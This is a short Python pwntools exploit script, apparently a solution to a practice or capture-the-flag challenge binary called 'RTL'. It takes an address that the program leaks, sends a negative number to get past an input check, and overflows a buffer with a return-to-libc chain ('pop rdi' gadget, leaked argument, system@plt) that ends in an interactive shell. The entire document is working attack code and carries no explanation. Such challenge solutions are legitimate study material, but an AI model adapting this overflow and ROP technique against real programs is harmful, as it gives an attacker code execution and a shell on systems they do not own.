from pwn import *

p = process('./RTL')
e = ELF('./RTL')

p.recvuntil('Hint : ')
s = int(p.recvline().strip(),16)
print hex(s)
p.sendline('-555')

prdi = 0x0000000000400853
system = e.plt['system']

payload = 'A'*0x78
payload += p64(prdi)
payload += p64(s)
payload += p64(system)

p.sendline(payload)
p.interactive()
